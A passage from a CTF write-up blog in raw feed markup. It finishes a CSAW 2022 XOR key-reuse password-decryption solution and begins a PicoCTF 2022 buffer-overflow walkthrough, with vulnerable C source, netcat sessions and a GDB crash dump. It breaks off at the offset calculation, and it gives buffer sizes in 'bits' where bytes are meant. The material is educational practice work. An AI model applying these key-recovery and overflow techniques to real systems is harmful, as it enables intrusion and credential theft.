<span class="n">encrypted_leaked_pw_from_service</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'kz</span><span class="se">\xc6\xb9\xd9</span><span class="s">Du</span><span class="se">\xcb\x8a\x9e\xe0\x9d\xbe</span><span class="s">o</span><span class="se">\xee\x03\xcf\xdd</span><span class="s">d'</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'encrypted_passwords.txt'</span><span class="p">,</span><span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">known_encrypted_pws</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
  <span class="k">return</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="n">y</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'big'</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">decrypt_bytes</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">)])</span>

<span class="k">for</span> <span class="n">count</span><span class="p">,</span> <span class="n">encrypted_pw</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">known_encrypted_pws</span><span class="p">):</span>
  <span class="k">if</span> <span class="n">encrypted_leaked_pw_from_service</span> <span class="o">==</span> <span class="n">encrypted_pw</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Encrypted Password"</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="s">"Matches Result Provided via the Web Service:"</span><span class="p">,</span> <span class="n">encrypted_pw</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">"Cacturne-Grass-Dark"</span><span class="p">,</span> <span class="n">encrypted_pw</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Key ="</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

<span class="k">print</span> <span class="p">(</span><span class="s">'Decrypted Password List:'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">encrypted_pw</span> <span class="ow">in</span> <span class="n">known_encrypted_pws</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">decrypt_bytes</span><span class="p">(</span><span class="n">encrypted_pw</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'@#$%^!!!'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>When we run this script, we see that the key works for all passwords, but it turns out to be incomplete:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~/sec/CTFs/CSAW2022]
‚îî‚îÄ<span class="nv">$ </span>python3 decrypt.py                                                                                      
Encrypted Password 2 Matches Result Provided via the Web Service: b<span class="s1">'kz\xc6\xb9\xd9Du\xcb\x8a\x9e\xe0\x9d\xbeo\xee\x03\xcf\xddd'</span>
Key <span class="o">=</span> b<span class="s1">'(\x1b\xa5\xcd\xac6\x1b\xae\xa7\xd9\x92\xfc\xcd\x1c\xc3G\xae\xaf\x0f'</span>
Decrypted Password List:
b<span class="s1">'Darkrai-Dark'</span>
b<span class="s1">'Happiny-Normal'</span>
b<span class="s1">'Cacturne-Grass-Dark'</span>
b<span class="s1">'Sneasel-Dark-Ice'</span>
b<span class="s1">'Rhyperior-Ground-Ro'</span>
b<span class="s1">'Chinchou-Water-Elec'</span>
b<span class="s1">'Excadrill-Ground-St'</span>
b<span class="s1">'Kricketune-Bug'</span>
b<span class="s1">'Pikipek-Normal-Flyi'</span>
b<span class="s1">'Basculin-Water'</span>
b<span class="s1">'Togetic-Fairy-Flyin'</span>
b<span class="s1">'Riolu-Fighting'</span>
b<span class="s1">'Spritzee-Fairy'</span>
b<span class="s1">'Silvally-Normal'</span>
b<span class="s1">'Wyrdeer-Normal-Psyc'</span>
b<span class="s1">'Herdier-Normal'</span>
b<span class="s1">'Thwackey-Grass'</span>
b<span class="s1">'Bronzong-Steel-Psyc'</span>
b<span class="s1">'Chespin-Grass'</span>
b<span class="s1">'Tornadus-Flying'</span>
b<span class="s1">'Combusken-Fire-Figh'</span>
b<span class="s1">'Carnivine-Grass'</span>
b<span class="s1">'Grubbin-Bug'</span>
b<span class="s1">'Goomy-Dragon'</span>
b<span class="s1">'1n53cu2357234mc1ph3'</span>
b<span class="s1">''</span>
</code></pre></div></div>

<ul>
  <li>To recover more of the key, we need to interact with the server again and use a longer plaintext string by completing one of the longer decrypted passwords:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~]
‚îî‚îÄ<span class="nv">$ </span>nc crypto.chal.csaw.io 5002
You can encrypt a pre-approved password using this service.

What is the password you would like to encrypt?

<span class="o">&gt;&gt;</span> Chinchou-Water-Electric
The encrypted password is: b<span class="s1">'ks\xcc\xa3\xcf^t\xdb\x8a\x8e\xf3\x88\xa8n\xee\x02\xc2\xcal\xe1\xfe\xd2\xaa'</span>
Would you like to go again? <span class="o">(</span>Y/N<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Now we can append our original script:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">likely_full_password</span> <span class="o">=</span> <span class="s">"Chinchou-Water-Electric"</span>
<span class="n">encrypted_cracked_pw_from_service</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'ks</span><span class="se">\xcc\xa3\xcf</span><span class="s">^t</span><span class="se">\xdb\x8a\x8e\xf3\x88\xa8</span><span class="s">n</span><span class="se">\xee\x02\xc2\xca</span><span class="s">l</span><span class="se">\xe1\xfe\xd2\xaa</span><span class="s">'</span>
<span class="n">extended_key</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">likely_full_password</span><span class="p">,</span> <span class="n">encrypted_cracked_pw_from_service</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Extended Key ="</span><span class="p">,</span> <span class="n">extended_key</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Decrypted Password List:'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">encrypted_pw</span> <span class="ow">in</span> <span class="n">known_encrypted_pws</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">decrypt_bytes</span><span class="p">(</span><span class="n">encrypted_pw</span><span class="p">,</span> <span class="n">extended_key</span><span class="p">))</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'@#$%^!!!'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>The output from this additional code reveals the rest of the passwords in full along with the full admin password, which is the flag:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Extended Key <span class="o">=</span> b<span class="s1">'(\x1b\xa5\xcd\xac6\x1b\xae\xa7\xd9\x92\xfc\xcd\x1c\xc3G\xae\xaf\x0f\x95\x8c\xbb\xc9'</span>
Decrypted Password List:
b<span class="s1">'Darkrai-Dark'</span>
b<span class="s1">'Happiny-Normal'</span>
b<span class="s1">'Cacturne-Grass-Dark'</span>
b<span class="s1">'Sneasel-Dark-Ice'</span>
b<span class="s1">'Rhyperior-Ground-Rock'</span>
b<span class="s1">'Chinchou-Water-Electric'</span>
b<span class="s1">'Excadrill-Ground-Steel'</span>
b<span class="s1">'Kricketune-Bug'</span>
b<span class="s1">'Pikipek-Normal-Flying'</span>
b<span class="s1">'Basculin-Water'</span>
b<span class="s1">'Togetic-Fairy-Flying'</span>
b<span class="s1">'Riolu-Fighting'</span>
b<span class="s1">'Spritzee-Fairy'</span>
b<span class="s1">'Silvally-Normal'</span>
b<span class="s1">'Wyrdeer-Normal-Psychic'</span>
b<span class="s1">'Herdier-Normal'</span>
b<span class="s1">'Thwackey-Grass'</span>
b<span class="s1">'Bronzong-Steel-Psychic'</span>
b<span class="s1">'Chespin-Grass'</span>
b<span class="s1">'Tornadus-Flying'</span>
b<span class="s1">'Combusken-Fire-Fighting'</span>
b<span class="s1">'Carnivine-Grass'</span>
b<span class="s1">'Grubbin-Bug'</span>
b<span class="s1">'Goomy-Dragon'</span>
b<span class="s1">'1n53cu2357234mc1ph32'</span>
b<span class="s1">''</span>
</code></pre></div></div>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="CSAW2022" /><category term="Crypto" /><summary type="html"><![CDATA[Challenge Text:]]></summary></entry><entry><title type="html">buffer overflow 1</title><link href="http://0.0.0.0:4000/writeups/2022/03/31/PicoCTF2022-buf1.html" rel="alternate" type="text/html" title="buffer overflow 1" /><published>2022-03-31T21:31:21-05:00</published><updated>2022-03-31T21:31:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2022/03/31/PicoCTF2022-buf1</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2022/03/31/PicoCTF2022-buf1.html"><![CDATA[<h1></h1>
<h3><font color="FF3030"> Challenge Text: </font></h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Author: Sanjay C / Palash Oswal

Control the return address. Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using nc saturn.picoctf.net 59737
</span></code></pre></div></div>
<h3><font color="FF3030"> Solution: </font></h3>

<ul>
  <li>We are provided with the following source code and the associated, compiled executable:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"asm.h"</span><span class="cp">
</span><span class="err">‚Äã</span>
<span class="cp">#define BUFSIZE 32
#define FLAGSIZE 64
</span><span class="err">‚Äã</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="s">"Please create 'flag.txt' in this directory with your"</span><span class="p">,</span>
                    <span class="s">"own debugging flag.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
<span class="err">‚Äã</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="err">‚Äã</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="err">‚Äã</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Okay, time to return... Fingers Crossed... Jumping to 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">get_return_address</span><span class="p">());</span>
<span class="p">}</span>
<span class="err">‚Äã</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
<span class="err">‚Äã</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
<span class="err">‚Äã</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Please enter your string: "</span><span class="p">);</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Looking at the code, we see that the program takes an unbounded input of which it has only allocated 32 bits for and consequently is vulnerable to a buffer overflow attack.   The developer was kind to us by providing feedback with respect to the return address value and so we‚Äôll know when/how we‚Äôve overwritten it while troubleshooting our exploit code.  Typically this won‚Äôt be the case, so we‚Äôll use GDB to help us determine these details when we get to that step.</p>
  </li>
  <li>
    <p>The goal will be to change the flow of the program by overwriting the return address here with the address of the ‚Äúwin()‚Äù function.  The win() function will print the value of the flag that we are looking for.</p>
  </li>
  <li>
    <p>We‚Äôre given an instanced service that we can connect to via netcat and find that when we enter strings we get the same return address each time (0x804932f):</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
‚îî‚îÄ$ nc saturn.picoctf.net 59737
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
‚îî‚îÄ$ nc saturn.picoctf.net 59737                                                                               
Please enter your string: 
tes2
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

</code></pre></div></div>
<p>Setting up a local environment to test the program and develop our exploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
‚îî‚îÄ$ ls
exploit.py  flag.txt  vuln  vuln.c

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
‚îî‚îÄ$ cat flag.txt
picoCTF{test_flag}

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
‚îî‚îÄ$ ./vuln
Please enter your string: 
test3
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
</code></pre></div></div>

<ul>
  <li>We find by running the executable locally that the return address is identical so ASLR is conveniently off and we can focus on finding the specific address of the win() function.  We can use GDB to figure this out.  <a href="https://github.com/longld/peda" target="_blank">PEDA - Python Exploit Development Assistance for GDB</a> is being used here on top of GDB.  While isn‚Äôt really needed for a basic challenge like this one, it can be extremely helpful in general and is highly recommended.  Running GDB and looking through the functions:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">shinris3n</span><span class="err">„âø</span><span class="n">kodachi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">sec</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">PicoCTF2022</span><span class="o">/</span><span class="n">buffer</span> <span class="n">overflow</span> <span class="mi">1</span><span class="p">]</span>
<span class="err">‚îî‚îÄ$</span> <span class="n">gdb</span> <span class="n">vuln</span>
<span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">Debian</span> <span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">90</span><span class="p">.</span><span class="mi">20210103</span><span class="o">-</span><span class="n">git</span>
<span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2021</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
<span class="n">License</span> <span class="n">GPLv3</span><span class="o">+:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="o">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
<span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="o">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="p">.</span>
<span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="p">.</span>
<span class="n">Type</span> <span class="s">"show copying"</span> <span class="n">and</span> <span class="s">"show warranty"</span> <span class="k">for</span> <span class="n">details</span><span class="p">.</span>
<span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">"x86_64-linux-gnu"</span><span class="p">.</span>
<span class="n">Type</span> <span class="s">"show configuration"</span> <span class="k">for</span> <span class="n">configuration</span> <span class="n">details</span><span class="p">.</span>
<span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="o">:</span>
<span class="o">&lt;</span><span class="n">https</span><span class="o">:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;.</span>
<span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="n">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="o">:</span>
    <span class="o">&lt;</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.gnu.org/software/gdb/documentation/&gt;.</span>

<span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="n">type</span> <span class="s">"help"</span><span class="p">.</span>
<span class="n">Type</span> <span class="s">"apropos word"</span> <span class="n">to</span> <span class="n">search</span> <span class="k">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s">"word"</span><span class="p">...</span>
<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="n">vuln</span><span class="p">...</span>
<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="n">in</span> <span class="n">vuln</span><span class="p">)</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">info</span> <span class="n">functions</span>
<span class="n">All</span> <span class="n">defined</span> <span class="n">functions</span><span class="o">:</span>

<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="o">:</span>
<span class="mh">0x08049000</span>  <span class="n">_init</span>
<span class="mh">0x08049040</span>  <span class="n">printf</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x08049050</span>  <span class="n">gets</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x08049060</span>  <span class="n">fgets</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x08049070</span>  <span class="n">getegid</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x08049080</span>  <span class="n">puts</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x08049090</span>  <span class="n">exit</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x080490a0</span>  <span class="n">__libc_start_main</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x080490b0</span>  <span class="n">setvbuf</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x080490c0</span>  <span class="n">fopen</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x080490d0</span>  <span class="n">setresgid</span><span class="err">@</span><span class="n">plt</span>
<span class="mh">0x080490e0</span>  <span class="n">_start</span>
<span class="mh">0x08049120</span>  <span class="n">_dl_relocate_static_pie</span>
<span class="mh">0x08049130</span>  <span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">bx</span>
<span class="mh">0x08049140</span>  <span class="n">deregister_tm_clones</span>
<span class="mh">0x08049180</span>  <span class="n">register_tm_clones</span>
<span class="mh">0x080491c0</span>  <span class="n">__do_global_dtors_aux</span>
<span class="mh">0x080491f0</span>  <span class="n">frame_dummy</span>
<span class="mh">0x080491f6</span>  <span class="n">win</span>
<span class="mh">0x08049281</span>  <span class="n">vuln</span>
<span class="mh">0x080492c4</span>  <span class="n">main</span>
<span class="mh">0x0804933e</span>  <span class="n">get_return_address</span>
<span class="mh">0x08049350</span>  <span class="n">__libc_csu_init</span>
<span class="mh">0x080493c0</span>  <span class="n">__libc_csu_fini</span>
<span class="mh">0x080493c5</span>  <span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">bp</span>
<span class="mh">0x080493cc</span>  <span class="n">_fini</span>
</code></pre></div></div>

<ul>
  <li>We can see that the address we want to actually go to is <code class="language-plaintext highlighter-rouge">0x080491f6  win</code>, and so our goal is to overwrite the return address with this one.  Since we have the source code and know the buffer length we can probably jump right into exploiting the service over netcat and working our way up from 32 characters, but to approach this in a way that works more generally (i.e. when we don‚Äôt get direct information about the address space from the program itself) we can continue to use GDB and generate a long string via metasploit‚Äôs pattern-create or this handy <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html" target="_blank">online tool</a>.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">shinris3n</span><span class="o">/</span><span class="n">sec</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">PicoCTF2022</span><span class="o">/</span><span class="n">buffer</span> <span class="n">overflow</span> <span class="mi">1</span><span class="o">/</span><span class="n">vuln</span> 
<span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">string</span><span class="o">:</span> 
<span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span>
<span class="n">Okay</span><span class="p">,</span> <span class="n">time</span> <span class="n">to</span> <span class="k">return</span><span class="p">...</span> <span class="n">Fingers</span> <span class="n">Crossed</span><span class="p">...</span> <span class="n">Jumping</span> <span class="n">to</span> <span class="mh">0x35624134</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="n">EAX</span><span class="o">:</span> <span class="mh">0x41</span> <span class="p">(</span><span class="sc">'A'</span><span class="p">)</span>
<span class="n">EBX</span><span class="o">:</span> <span class="mh">0x41326241</span> <span class="p">(</span><span class="err">'</span><span class="n">Ab2A</span><span class="err">'</span><span class="p">)</span>
<span class="n">ECX</span><span class="o">:</span> <span class="mh">0x41</span> <span class="p">(</span><span class="sc">'A'</span><span class="p">)</span>
<span class="n">EDX</span><span class="o">:</span> <span class="mh">0xffffffff</span> 
<span class="n">ESI</span><span class="o">:</span> <span class="mh">0x1</span> 
<span class="n">EDI</span><span class="o">:</span> <span class="mh">0x80490e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>       <span class="n">endbr32</span><span class="p">)</span>
<span class="n">EBP</span><span class="o">:</span> <span class="mh">0x62413362</span> <span class="p">(</span><span class="err">'</span><span class="n">b3Ab</span><span class="err">'</span><span class="p">)</span>
<span class="n">ESP</span><span class="o">:</span> <span class="mh">0xffffd0b0</span> <span class="p">(</span><span class="s">"Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="n">EIP</span><span class="o">:</span> <span class="mh">0x35624134</span> <span class="p">(</span><span class="err">'</span><span class="mi">4</span><span class="n">Ab5</span><span class="err">'</span><span class="p">)</span>
<span class="n">EFLAGS</span><span class="o">:</span> <span class="mh">0x10282</span> <span class="p">(</span><span class="n">carry</span> <span class="n">parity</span> <span class="n">adjust</span> <span class="n">zero</span> <span class="n">SIGN</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
<span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x35624134</span>
<span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mo">0000</span><span class="o">|</span> <span class="mh">0xffffd0b0</span> <span class="p">(</span><span class="s">"Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">0004</span><span class="o">|</span> <span class="mh">0xffffd0b4</span> <span class="p">(</span><span class="s">"b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0b8</span> <span class="p">(</span><span class="s">"8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">0012</span><span class="o">|</span> <span class="mh">0xffffd0bc</span> <span class="p">(</span><span class="s">"Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">0016</span><span class="o">|</span> <span class="mh">0xffffd0c0</span> <span class="p">(</span><span class="s">"c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">0020</span><span class="o">|</span> <span class="mh">0xffffd0c4</span> <span class="p">(</span><span class="s">"2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">0024</span><span class="o">|</span> <span class="mh">0xffffd0c8</span> <span class="p">(</span><span class="s">"Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0cc</span> <span class="p">(</span><span class="s">"c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"</span><span class="p">)</span>
<span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
<span class="n">Legend</span><span class="o">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
<span class="n">Stopped</span> <span class="n">reason</span><span class="o">:</span> <span class="n">SIGSEGV</span>
<span class="mh">0x35624134</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>When the program crashes, we can see the return address (the value of the EIP register) was overwritten with ‚Äú4Ab5‚Äù.  Using the online tool we see the offset is 44 bits.</li>
</ul>

